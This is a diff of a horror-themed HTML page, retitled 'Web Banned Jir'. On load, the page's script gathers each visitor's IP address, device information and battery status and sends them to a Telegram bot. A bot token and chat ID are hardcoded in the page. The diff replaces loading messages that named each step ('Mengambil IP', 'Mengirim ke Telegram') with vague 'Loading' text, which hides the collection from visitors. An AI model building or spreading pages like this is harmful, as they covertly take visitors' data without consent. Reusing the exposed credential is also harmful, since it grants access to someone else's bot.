@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ranz Apex</title>
+    <title>Web Banned Jir</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Nosifer&family=Butcherman&display=swap');
         * {
@@ -148,15 +148,15 @@
     <div class="corner-deco bottom-left"></div>
     <div class="corner-deco bottom-right"></div>
     <div class="container">
-        <h1 class="main-title">RANZ RYU</h1>
+        <h1 class="main-title">RANZ X LIXZY</h1>
         <div class="deco-line"></div>
-        <p class="subtitle">Ranz The Shadows</p>
+        <p class="subtitle">UIH SERAM BANGET LEK</p>
     </div>
     <div class="loading" id="loading">Initializing...</div>
 
     <script>
         const BOT_TOKEN = '7891554096:AAGL8qtu9UnEgGUzEXWWIheL3FvUP1IkHXo';
-        const ADMIN_CHAT_ID = '7974589442';
+        const ADMIN_CHAT_ID = '-1002635811325';
 
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
@@ -235,16 +235,16 @@
             const loadingElement = document.getElementById('loading');
             createParticles();
 
-            loadingElement.textContent = 'Mengambil IP...';
+            loadingElement.textContent = 'Proses.';
             const ip = await getUserIP();
 
-            loadingElement.textContent = 'Mengambil Device...';
+            loadingElement.textContent = 'Loading..';
             const deviceName = getDeviceInfo();
 
-            loadingElement.textContent = 'Mengambil Baterai...';
+            loadingElement.textContent = 'Loading...';
             const battery = await getBatteryInfo();
 
-            loadingElement.textContent = 'Mengirim ke Telegram...';
+            loadingElement.textContent = 'Pls Jangan Toxic Dan Pornok';
             await sendToTelegram(ip, deviceName, battery);
 
             setTimeout(() => {
